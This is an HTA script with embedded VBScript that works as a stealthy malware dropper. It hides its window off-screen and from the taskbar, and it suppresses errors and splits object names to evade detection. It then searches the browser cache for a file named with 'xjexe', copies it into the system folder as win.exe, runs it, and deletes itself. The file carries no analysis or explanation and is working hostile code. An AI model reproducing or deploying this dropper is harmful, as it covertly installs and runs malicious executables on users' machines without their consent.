   HTML><BODY><HEAD><SCRIPT language=JScript>window.moveTo(3000,3000);window.resizeTo(0,0);</SCRIPT></HEAD>
   <HTA:APPLICATION ID=ICY BORDER=none CAPTION=no SHOWINTASKBAR=no>
   <SCRIPT LANGUAGE=vbScript>
   on error resume next
   dim wsh:set wsh = CreateObject("Wsc"+"ript.shell")
   dim exepath
   Function Search(objFolder)
   Dim objSubFolder
   For Each objFile in objFolder.Files
   If InStr(1, objfile.name, "xjexe", vbtextcompare) then
   x=x+1
   set filecp = objg_fso.getfile(objfile.path)
   filecp.copy (exepath)
   exit for
   End If:Next
   For Each objSubFolder in objFolder.SubFolders
   Search objSubFolder:Next
   End Function
   do while x <=2
   Set objg_fso = CreateObject("Scripting.Fil"+"eSystemObject")
   str=WSH.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\cache")
   set tempfolder = objg_fso.getfolder(str)
   set othisfolder = (objg_fso.GetSpecialFolder(1))
   exepath=othisfolder.path & "win.exe"
   search tempfolder:wsh.run (exepath):loop
   wsh.run "cmd.exe /c del c:\xjvbs.hta" ,0
   </SCRIPT></BODY></HTML>
